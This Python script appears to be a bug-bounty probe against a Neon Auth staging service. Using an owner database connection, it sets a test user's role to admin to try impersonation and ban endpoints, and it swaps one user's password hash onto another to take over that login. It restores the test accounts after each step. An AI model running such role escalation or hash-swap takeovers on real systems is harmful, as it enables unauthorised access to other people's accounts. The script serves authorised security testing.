# -*- coding: utf-8 -*-
"""V28c: owner DB-write capability probes:
A. UPDATE user.role='admin' -> admin/impersonate-user unlock?
B. UPDATE account.password (copy U1 hash to U2) -> login as U2 with U1 pw?
C. verify low-priv role cannot do same (already DENY read; test write too)
all on test users, restore after"""
import json, ssl, time, http.client, uuid

NA_HOST = "ep-crimson-fog-w2gucld1.neonauth.us-east-2.aws.neon.build"
ctx = ssl.create_default_context()
PASS = "SecTest!2026pass"
U1_ID = "f2366454-d3f4-4a80-ba3b-e5ca93c25f82"
U2_ID = "66b42c6b-c41e-4c5a-a2fa-aa5957cfaec0"


def out(s):
    print("[%s] %s" % (time.strftime("%H:%M:%S"), s), flush=True)


def na(method, path, body=None, cookie=None, origin="http://localhost:3000", timeout=25):
    conn = http.client.HTTPSConnection(NA_HOST, timeout=timeout, context=ctx)
    hdrs = {"Content-Type": "application/json", "Origin": origin,
            "User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    if cookie:
        hdrs["Cookie"] = cookie
    conn.request(method, path, json.dumps(body).encode() if body is not None else None, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    ck = resp.getheader("Set-Cookie", "")
    conn.close()
    time.sleep(0.25)
    return resp.status, data, ck


def db_cur():
    import psycopg
    from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
    conn = http.client.HTTPSConnection("console-stage.neon.build", timeout=30, context=ctx)
    conn.request("GET", "/api/v2/projects/orange-sun-90493739/connection_uri"
                 "?database_name=neondb&role_name=neondb_owner"
                 "&branch_id=br-wandering-field-w2ob6mpn",
                 headers={"X-Bug-Bounty": "xxbo",
                          "Authorization": "Bearer " + json.load(open(r"F:\scan\neon_report\_apikey.json"))["key"]})
    r = conn.getresponse()
    uri = json.loads(r.read().decode())["uri"]
    conn.close()
    p = urlsplit(uri)
    q = [(k, v) for k, v in parse_qsl(p.query) if k != "channel_binding"]
    uri2 = urlunsplit((p.scheme, p.netloc, p.path, urlencode(q), p.fragment))
    dbc = psycopg.connect(uri2, connect_timeout=15)
    dbc.autocommit = True
    return dbc


def signin(email, pw):
    st, d, ck = na("POST", "/neondb/auth/sign-in/email", {"email": email, "password": pw})
    return st, d, ck.split(";")[0] if ck else None


def main():
    out("== V28c owner DB-write probes ==")
    # A. role=admin via DB
    dbc = db_cur()
    with dbc.cursor() as cur:
        cur.execute("UPDATE neon_auth.user SET role='admin' WHERE id=%s", (U1_ID,))
    st, d, ck = signin("libobo1229+na_org1@gmail.com", PASS)
    out("U1 sign-in after role=admin: %s" % st)
    c1 = ck
    st, d, _ = na("POST", "/neondb/auth/admin/impersonate-user",
                  {"userId": U2_ID}, c1)
    out("admin/impersonate-user (role=admin) -> %s %s" % (st, d[:120]))
    st, d, _ = na("POST", "/neondb/auth/admin/ban-user", {"userId": U2_ID, "banReason": "x"}, c1)
    out("admin/ban-user (role=admin) -> %s %s" % (st, d[:120]))
    # restore role
    with dbc.cursor() as cur:
        cur.execute("UPDATE neon_auth.user SET role='user' WHERE id=%s", (U1_ID,))
    # B. password hash takeover: copy U1 hash -> U2
    with dbc.cursor() as cur:
        cur.execute("SELECT password FROM neon_auth.account WHERE \"userId\"=%s", (U1_ID,))
        u1_hash = cur.fetchone()[0]
        cur.execute("SELECT password FROM neon_auth.account WHERE \"userId\"=%s", (U2_ID,))
        u2_orig = cur.fetchone()[0]
        cur.execute("UPDATE neon_auth.account SET password=%s WHERE \"userId\"=%s", (u1_hash, U2_ID))
    st, d, ck = signin("libobo1229+na_org2@gmail.com", PASS)  # U1's password on U2
    out("U2 login w/ U1 password (hash swapped) -> %s %s" % (st, d[:100]))
    if st == 200:
        st2, d2, _ = na("GET", "/neondb/auth/get-session", cookie=ck.split(";")[0])
        out("session as U2 -> %s" % (d2[:180]))
    # restore U2 hash
    with dbc.cursor() as cur:
        cur.execute("UPDATE neon_auth.account SET password=%s WHERE \"userId\"=%s", (u2_orig, U2_ID))
    out("hashes restored")
    # C. verify U2 back to normal login
    st, d, ck = signin("libobo1229+na_org2@gmail.com", PASS)
    out("U2 normal login after restore: %s" % st)
    dbc.close()
    out("done")


if __name__ == "__main__":
    main()
